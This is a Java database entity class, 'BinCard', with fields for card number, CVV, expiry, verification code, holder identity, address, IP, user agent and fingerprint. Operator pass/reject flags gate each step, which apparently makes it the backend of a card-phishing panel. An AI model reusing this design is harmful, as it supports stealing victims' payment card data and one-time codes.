package com.pj.project.bin_card;

import java.io.Serializable;
import java.util.Objects;

import cn.hutool.log.StaticLog;
import com.baomidou.mybatisplus.annotation.*;
import com.baomidou.mybatisplus.extension.activerecord.Model;
import com.pj.project.visitor_log.VisitorLog;
import lombok.EqualsAndHashCode;

import lombok.Data;
import lombok.experimental.Accessors;
import sun.reflect.generics.visitor.Visitor;

/**
 * Model: bin_card --
 *
 * @author qzy
 */
@Data
@Accessors(chain = true)
@TableName("bin_card")
@EqualsAndHashCode(callSuper = false)
public class BinCard extends Model<BinCard> implements Serializable {


    // ---------- 表中字段 ----------
    /**
     *
     */
    @TableId(type = IdType.AUTO)
    private Integer id;

    /**
     * 0: '等待中',
     * 1: '成功',
     * 2: '失败'
     */
    private Integer state;

    /**
     * 姓氏
     */
    private String familyName;
    private String info;
    private String cardType;
    private String debit;
    private String cardLevel;
    /**
     * 名字
     */
    private String name;

    /**
     * 卡号
     */
    private String card;

    /**
     * 安全码
     */
    private String cvv;

    /**
     * 日期
     */
    private String cardDate;

    /**
     * 验证码
     */
    private String validity;

    /**
     * 邮编
     */
    private String post;

    /**
     * 地址
     */
    private String address;

    /**
     *
     */
    private String online;

    /**
     *
     */
    private String ip;

    /**
     *
     */
    private String ua;

    /**
     *
     */
    private Long date;

    /**
     * 手机号码
     */
    private String phone;

    /**
     * 邮箱
     */
    private String email;

    /**
     *
     */
    private boolean sync;

    /**
     *
     */
    private String syncfinish;

    /**
     * 指纹
     */
    private String fingerprint;
    /**
     * 州
     */
    private String stateAddress;
    /**
     * 城市
     */
    private String city;


    /**
     * 0标识未操作 1 通行 -1已驳回
     */
    private Integer awaitpage = 0;

    /**
     * 0标识不通行 1  通行
     */
    private Integer awaitcode = 0;

    /**
     *
     */
    private boolean repetition;


    private int stepTotal = 1;

    private int currentStep = 1;

    private String sysName;

    private String text;

    private String cardHolder;
    private String notice;

    private String passSetting="code";
    private String remark;

    private int deleteFlag=0;

    @TableField(exist = false)
    private VisitorLog other;

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        BinCard binCard = (BinCard) o;
        return Objects.equals(id, binCard.id) &&
                Objects.equals(state, binCard.state) &&
                Objects.equals(familyName, binCard.familyName) &&
                Objects.equals(name, binCard.name) &&
                Objects.equals(card, binCard.card) &&
                Objects.equals(cvv, binCard.cvv) &&
                Objects.equals(cardDate, binCard.cardDate) &&
                Objects.equals(validity, binCard.validity) &&
                Objects.equals(post, binCard.post) &&
                Objects.equals(address, binCard.address) &&
                Objects.equals(phone, binCard.phone) &&
                Objects.equals(email, binCard.email) &&
                Objects.equals(fingerprint, binCard.fingerprint) &&
                Objects.equals(stateAddress, binCard.stateAddress) &&
                Objects.equals(city, binCard.city) &&
                Objects.equals(cardHolder, binCard.cardHolder);
    }

    @Override
    public int hashCode() {
        return Objects.hash(id, state, familyName, name, card, cvv, cardDate, validity, post, address, phone, email, fingerprint, stateAddress, city,text, cardHolder);
    }

    @TableField(exist = false)
    private boolean hasUpdate;

    @TableField(exist = false)
    private boolean cardUpdate;

    @TableField(exist = false)
    private boolean cardValid;

    @TableField(exist = false)
    private boolean codeValid;

    @TableField(exist = false)
    private boolean isNew;

    @TableField(exist = false)
    private String field;



}

